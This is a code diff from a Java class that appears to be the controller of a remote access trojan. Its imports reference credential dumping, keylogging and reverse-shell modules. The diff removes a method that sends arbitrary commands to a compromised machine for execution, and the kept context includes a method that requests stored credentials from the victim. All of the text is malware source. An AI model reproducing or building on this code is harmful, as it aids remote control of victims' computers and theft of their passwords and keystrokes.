@@ -6,7 +6,6 @@ import GUI.TableUtils.Credentials.Dumper.CredentialsDumper;
 import GUI.TableUtils.Credentials.Packets.CombinedCredentials;
 import GUI.TableUtils.KeyLogger.KeyloggerEvents;
 import GUI.TableUtils.Permissions.Permissions;
-import GUI.TableUtils.ReverseShell.Shell;
 import GUI.TableUtils.SystemState.State;
 import Information.*;
 
@@ -225,17 +224,6 @@ public class Streams {
         return null;
     }
 
-    public String sendAndReadAction(Shell action, String command) throws IOException {
-        JSONObject jsonObject = new JSONObject();
-        if (action == Shell.COMMAND) {
-            
-            jsonObject.put("ACTION", "EXECUTE_COMMAND");
-            jsonObject.put("command", command);
-            mainStream.sendString(jsonObject.toString());
-            return readString();
-        }
-        return null;
-    }
 
     public CombinedCredentials getCredentials(Action action, String dbPath) throws IOException {
         JSONObject jsonObject = new JSONObject();
